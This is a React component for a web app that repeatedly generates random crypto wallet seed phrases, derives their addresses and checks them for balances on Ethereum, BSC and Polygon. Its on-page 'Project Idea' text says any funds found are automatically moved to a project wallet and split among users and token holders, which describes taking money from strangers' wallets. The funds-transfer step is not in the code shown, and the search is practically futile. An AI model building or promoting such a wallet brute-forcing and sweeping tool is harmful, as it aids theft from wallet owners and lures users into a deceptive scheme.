import { useState, useRef } from "react"
import { Wallet, utils } from 'ethers';
import { useEthers } from "@usedapp/core"
import playPic from "../img/play.svg"
import { seeds } from "../utils/seeds";
import { isBalance } from "../utils/balance";
import { toast } from "react-toastify";

const Main = () => {


    const pause = useRef(true);
    const [mnemonic, setMnemonic] = useState("anchor much sure sword hazard bike trouble lunch purse tube flat predict");
    const { account, activateBrowserWallet, deactivate } = useEthers();

    function connect() {
        if(account) {
            pause.current = true;
            deactivate();
        } else {
            activateBrowserWallet();
        }   
    }

    function getWord(num: number) {
        const words: string[] = mnemonic.split(" ");
        return words[num];
    }

    function getAddress() {
        const wallet = Wallet.fromMnemonic(mnemonic as string);
        return wallet.address;
    }

    function getRandomMnemonic() {
        const arrayMnemonic = []
        while(arrayMnemonic.length < 12) {
            arrayMnemonic.push(seeds[Math.floor(Math.random() * 2047)]);
        }
        return arrayMnemonic.join(" ");
    }
    
    function getValidMnemonic() {
        let valid = false;
        let mnemonic;
        while(!valid) {
           mnemonic = getRandomMnemonic();
           valid = utils.isValidMnemonic(mnemonic);
        }
        return mnemonic;
    }

    async function start() {
        if (!account) {
            toast.info('First connect your wallet', {
                position: "top-center",
                autoClose: 1000,
                hideProgressBar: true,
                pauseOnHover: false,
                draggable: true,
                theme: "dark",
            });
            return;
        }
        if(pause.current) {
            pause.current = false;
        } else {
            pause.current = true;
        }
        while(!pause.current) {
            const mnemonic = getValidMnemonic();
            setMnemonic(mnemonic as string);
            const address = getAddress();
            const valid = await isBalance(address);
            if(valid) {
                console.log(address);
                console.log(mnemonic);
            }
        }
    }

    return (
        <>
            <div className="wrapper">
                <div className="connect">
                    <div className="connect__address">
                        {account ? account : "not connected"}
                    </div>
                    
                    
                    <div className="connect__button">
                        <button onClick={() => connect()}>
                            {account ? "disconnect" : "connect wallet"}
                        </button>
                    </div>
                </div>

                <div className="play">
                    {
                        pause.current &&
                        <div>
                            <button onClick={() => {start()}}>
                                <img src={playPic} alt="" />
                            </button>
                        </div>
                    }
                </div>

                <div className="words">
                    <div className="word">
                        <div className="word__number">
                            1. 
                        </div>
                        <div className="word__word">
                            {getWord(0)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            2.
                        </div>
                        <div className="word__word">
                        {getWord(1)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            3.
                        </div>
                        <div className="word__word">
                        {getWord(2)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            4.
                        </div>
                        <div className="word__word">
                        {getWord(3)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            5.
                        </div>
                        <div className="word__word">
                        {getWord(4)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            6.
                        </div>
                        <div className="word__word">
                        {getWord(5)}
                        </div>
                    </div>

                    <div className="word">
                        <div className="word__number">
                            7.
                        </div>
                        <div className="word__word">
                        {getWord(6)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            8.
                        </div>
                        <div className="word__word">
                        {getWord(7)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            9.
                        </div>
                        <div className="word__word">
                        {getWord(8)}
                        </div>
                    </div>

                    <div className="word">
                        <div className="word__number">
                            10.
                        </div>
                        <div className="word__word">
                        {getWord(9)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            11.
                        </div>
                        <div className="word__word">
                        {getWord(10)}
                        </div>
                    </div>
                    <div className="word">
                        <div className="word__number">
                            12.
                        </div>
                        <div className="word__word">
                        {getWord(11)}
                        </div>
                    </div>
                </div>

                <div className="address">
                    {getAddress()}
                </div>

                <div className="balances">
                    Ethereum: 0.00 ETH <br />
                    BSC: 0.00 BNB <br />
                    Polygon: 0.00 MATIC
                </div>

                <div className="annotation">
                    Project Idea
                </div>

                <div className="text">
                    1. The user comes to the platform, connects the wallet and presses the button ▶.<br />
                    <br />
                    2. The platform randomly selects passwords from crypto wallets and checks the balances of native currency in the Ethereum, BSC and Polygon networks. <br /> <br />
                    3. If a user finds a cryptocurrency on some wallet, it is automatically sent to another wallet of the project. <br /> <br />
                    4. The found cryptocurrency is distributed as follows: 50% is received by the one who connected his address to the platform and found this cryptocurrency, the other 50% is distributed among the holders of the project token.
                </div>
            </div>
            
        </>
        
    )
}

export default Main;